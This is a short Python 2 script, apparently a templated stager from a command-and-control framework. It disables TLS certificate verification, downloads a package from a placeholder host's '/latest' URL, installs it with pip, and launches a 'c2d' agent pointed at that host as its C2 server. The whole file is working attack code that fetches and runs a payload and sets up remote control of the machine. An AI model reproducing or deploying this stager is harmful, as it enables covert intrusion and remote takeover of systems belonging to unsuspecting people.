import os, urllib, pip, re, subprocess, ssl
ssl._create_default_https_context = ssl._create_unverified_context


def install(package):
    pip.main(['install', '--user', package])


if __name__ == "__main__":
    install('wheel')

    try:
        os.mkdir('agent')
    except Exception, e:
        print e

    os.chdir('agent')
    if {{ ssl }}:
        url = "https://{{hostname}}/latest"
        port = '443'
    else:
        url = "http://{{hostname}}/latest"
        port = '80'

    filename = re.findall("filename=(.+)", urllib.urlopen(url).info().getheader("Content-Disposition"))[0]
    whl = urllib.urlretrieve(url, filename)
    install(filename)
    print '[+] Install succesfull, configuring host'
    host = '{{hostname}}'.split(':')
    if len(host) == 2:
        port = host[1]
    host = host[0]
    if {{ ssl }}:
        subprocess.call(['c2d', '--c2-host', host, '--c2-port', port, '--ssl'])
    else:
        subprocess.call(['c2d', '--c2-host', host, '--c2-port', port, '--no-ssl'])

